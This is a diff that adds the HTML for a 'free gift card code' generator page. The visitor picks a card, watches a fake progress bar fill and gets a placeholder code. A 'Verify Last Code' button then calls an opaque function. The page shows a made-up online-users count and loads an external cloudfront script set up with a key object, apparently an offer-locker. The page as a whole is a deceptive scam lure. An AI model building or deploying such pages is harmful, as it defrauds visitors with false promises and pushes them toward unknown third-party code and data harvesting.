@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>All in one giftcards</title>
+    <meta name="description" content="All in one giftcards"/>
+    <meta property="og:title" content="All in one giftcards"/>
+    <meta property="og:description" content="All in one giftcards"/>
+    <meta name="referrer" content="no-referrer">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="style.js"></script>
+    <script src="main.js"></script>
+  </head>
+  <body>
+    <body>
+      <canvas id='ramat'></canvas>
+      <div class="maxs">
+        <div class="jdl-hdr">FREE GIFT CARD CODE</div>
+        <div class="Main1 center" style="display:none" id="Mainstep1"></div>
+        <div class="Main1" id="Mainstep2">
+          <h3 style="color: #00172f;">CHOOSE YOUR CARD</h3>
+          <label class="containerPack" onclick="functionPack1(1)">
+          <input type="radio">
+          <span class="checkmarkPack card1"></span>
+          </label>  
+          <label class="containerPack" onclick="functionPack1(2)">
+          <input type="radio">
+          <span class="checkmarkPack card2"></span>
+          </label>
+          <label class="containerPack" onclick="functionPack1(3)">
+          <input type="radio">
+          <span class="checkmarkPack card3"></span>
+          </label>  
+          <label class="containerPack" onclick="functionPack1(4)">
+          <input type="radio">
+          <span class="checkmarkPack card4"></span>
+          </label>  
+          <label class="containerPack" onclick="functionPack1(5)">
+          <input type="radio">
+          <span class="checkmarkPack card5"></span>
+          </label>
+          <label class="containerPack" onclick="functionPack1(6)">
+          <input type="radio">
+          <span class="checkmarkPack card6"></span>
+          </label>  
+          <label class="containerPack" onclick="functionPack1(7)">
+          <input type="radio">
+          <span class="checkmarkPack card7"></span>
+          </label>   
+          <label class="containerPack" onclick="functionPack1(8)">
+          <input type="radio">
+          <span class="checkmarkPack card8"></span>
+          </label> 
+          <label class="containerPack" onclick="functionPack1(9)">
+          <input type="radio">
+          <span class="checkmarkPack card9"></span>
+          </label>    
+          <label class="containerPack" onclick="functionPack1(10)">
+          <input type="radio">
+          <span class="checkmarkPack card10"></span>
+          </label>  
+          <label class="containerPack" onclick="functionPack1(11)">
+          <input type="radio">
+          <span class="checkmarkPack card11"></span>
+          </label>    
+          <label class="containerPack" onclick="functionPack1(12)">
+          <input type="radio">
+          <span class="checkmarkPack card12"></span>
+          </label>  
+        </div>
+        <div class="Main1 hideform" id="Mainstep3">
+          <div class="Packket2">
+            <div class="Probackground">
+              <div class="percent" id="percent"> 0% </div>
+              <div class="Progressbar" id="Progressbar"></div>
+            </div>
+            <div  id="gencode" class="Lastcode">0000-0000-0000-0000</div>
+          </div>
+        </div>
+        <div class="Main1 hideform" id="Mainstep4">
+          <div class="Packket2">
+            <img id="selectedimage" class="selectedimage"> 
+            <div  id="gencode1" class="Lastcode">0000-0000-0000-0000</div>
+            <button onclick="_Wi()" class="button">Verify Last Code</button>   
+          </div>
+        </div>
+        <div class="recentActivity">
+          <div class="footer">
+            <span style="color:#262626;">Server Status:<span style="color:#01ffad;"> Online</span></span> - 
+            <span style="color:#262626;">Online Users: <span id="onlinuserid" style="color:#01ffad;">251</span>
+            </span>
+            <p></p>
+            <div class="container">
+              <div class="row">
+                <div class="col-md-12 text-center">
+                  <span>Copyright © Free Gift Card Code. Use of this site constitutes acceptance of our Terms of service and Privacy Policy. All Rights Reserved.  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+  </body>
+  <script type="text/javascript">
+    var UbvvF_Gix_bDLzrc={"it":4362032,"key":"e1c14"};
+  </script>
+  <script src="https://d29kwert3pzn1t.cloudfront.net/a6a24e7.js"></script>
+  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,4834447,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();
+  </script>
+  <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4834447&101" alt="" border="0"></a></noscript>
+  </body>
+</html>
